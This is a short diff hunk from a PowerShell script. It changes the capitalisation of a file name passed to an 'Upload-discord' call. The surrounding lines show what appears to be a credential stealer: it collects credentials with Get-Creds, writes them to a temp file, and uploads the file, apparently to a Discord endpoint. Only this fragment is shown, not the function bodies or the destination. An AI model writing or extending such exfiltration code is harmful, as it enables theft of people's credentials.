@@ -74,7 +74,7 @@ $creds = Get-Creds
 
 echo $creds >> $env:TMP\$FileName
 
-Upload-discord -file "User-creds.csv"
+Upload-discord -file "User-Creds.csv"
 
 
 
